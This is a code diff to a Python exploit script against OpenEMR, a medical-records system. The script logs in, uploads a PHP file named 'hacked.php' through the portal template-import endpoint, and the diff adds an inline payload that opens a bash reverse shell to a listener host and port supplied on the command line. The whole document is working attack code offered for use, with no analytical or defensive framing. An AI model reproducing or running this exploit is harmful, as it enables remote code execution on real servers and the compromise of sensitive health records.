@@ -5,11 +5,12 @@ from log_colors import *
 
 class OpenEMRAuthShell:
 
-    def __init__(self, url, user, pswd, shell_file):
+    def __init__(self, url, user, pswd, lhost, lport):
         print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
         self.url = url
         self.user, self.pswd = user, pswd
-        self.payload = open(shell_file, "r")
+        #self.payload = open(shell_file, "r")
+        self.lhost, self.lport = lhost, lport
         self.session = requests.Session()
 
     def login(self):
@@ -34,12 +35,16 @@ class OpenEMRAuthShell:
 
     def exploit(self):
         self.login()
+        shell_php = '<?php '
+        shell_php += 'exec("/bin/bash -c \'bash -i >& /dev/tcp/' + self.lhost
+        shell_php += '/' + self.lport + ' 0>&1\'"); ?>'
         print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
+        print (LogColors.YELLOW + "shell: " + shell_php + LogColors.ENDC)
         pay = {
             "site" : "default",
             "mode" : "save",
             "docid" : "hacked.php",
-            "content" : self.payload.read(),
+            "content" : shell_php,
         }
         r = self.session.post(
             self.url + "/portal/import_template.php?site=default",
@@ -59,11 +64,14 @@ if __name__ == '__main__':
     parser.add_argument('-u','--url', required = True, help = "target url")
     parser.add_argument('-user','--username', required = True, help = "auth username")
     parser.add_argument('-pswd','--password', required = True, help = "auth password")
-    parser.add_argument('-f','--file', required = True, help = "reverse shell file: (hack.php)")
+    #parser.add_argument('-f','--file', required = True, help = "reverse shell file: (hack.php)")
+    parser.add_argument('-lh','--lhost', required = True, help = "reverse shell listener host")
+    parser.add_argument('-lp','--lport', required = True, help = "reverse shell listener port")
     args = vars(parser.parse_args())
     url = args["url"]
-    shell_file = args['file']
+    #shell_file = args['file']
+    lhost, lport = args['lhost'], args['lport']
     user, pswd = args["username"], args["password"]
-    cve = OpenEMRAuthShell(url, user, pswd, shell_file)
+    cve = OpenEMRAuthShell(url, user, pswd, lhost, lport)
     cve.exploit()
 
